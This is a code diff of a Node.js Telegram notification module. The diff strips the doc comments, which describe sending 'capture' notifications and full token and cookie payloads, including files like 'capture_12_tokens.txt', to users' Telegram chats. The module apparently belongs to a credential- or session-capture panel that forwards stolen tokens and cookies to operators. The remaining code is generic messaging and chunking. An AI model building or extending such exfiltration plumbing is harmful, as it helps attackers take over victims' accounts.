@@ -5,16 +5,6 @@ const db = require('../database/connection');
 const TELEGRAM_MAX_LEN = 4096;
 
 /**
- * Send a Telegram notification to a user's configured chat.
- *
- * - Reads the user's telegram_id + telegram_bot_token from the DB.
- * - Respects the notify_prt preference (only sends when enabled).
- * - Uses HTML parse mode by default (matches capture notifications built
- *   with HTML <b>/<pre> tags).
- * - Auto-splits messages longer than Telegram's 4096-char limit into
- *   multiple sequentially-sent messages so full token/cookie payloads are
- *   never silently truncated.
- *
  * @param {number|string} userId
  * @param {string} message  HTML-formatted message
  * @param {object} [options]
@@ -58,8 +48,6 @@ async function sendTelegramNotification(userId, message, options = {}) {
         });
         anySent = true;
       } catch (err) {
-        // If HTML parsing fails (e.g. malformed tags from older callers),
-        // retry this chunk without parse_mode so the message still delivers.
         if (parse_mode && err.response && err.response.status === 400) {
           try {
             await axios.post(url, {
@@ -85,9 +73,6 @@ async function sendTelegramNotification(userId, message, options = {}) {
 }
 
 /**
- * Send a notification to the admin Telegram chat configured via env.
- * Uses HTML parse mode with the same chunking + fallback safety net.
- *
  * @param {string} message
  * @param {object} [options]
  * @param {string} [options.parse_mode='HTML']
@@ -177,10 +162,6 @@ async function sendAdminDocument(filename, fileContent, caption) {
 }
 
 /**
- * Split a message into chunks no longer than maxLen chars.
- * Splits on newline boundaries when possible to avoid cutting mid-HTML-tag
- * or mid-token; falls back to hard slicing if a single line exceeds maxLen.
- *
  * @param {string} text
  * @param {number} maxLen
  * @returns {string[]}
@@ -212,15 +193,6 @@ function chunkMessage(text, maxLen) {
 }
 
 /**
- * Send a file (document) to a user's configured Telegram chat via the
- * Telegram `sendDocument` API. Used for long token/cookie payloads that
- * would otherwise exceed Telegram's 4096-char sendMessage limit.
- *
- * - Respects notify_prt preference (via options.requireNotifyPrt).
- * - caption is sent with the file (max 1024 chars per Telegram rules;
- *   longer captions are truncated automatically).
- * - caption_parse_mode defaults to 'HTML'.
- *
  * @param {number|string} userId
  * @param {string} filename   e.g. "capture_12_tokens.txt"
  * @param {string} fileContent  raw text content of the file
@@ -268,8 +240,7 @@ async function sendTelegramDocument(userId, filename, fileContent, caption, opti
     await axios.post(url, form);
     return true;
   } catch (err) {
-    // If HTML caption parsing fails, retry without parse_mode so the
-    // caption still delivers (text-only, no HTML interpretation).
+
     if (caption_parse_mode && err.response && err.response.status === 400) {
       try {
         const [users] = await db.query(
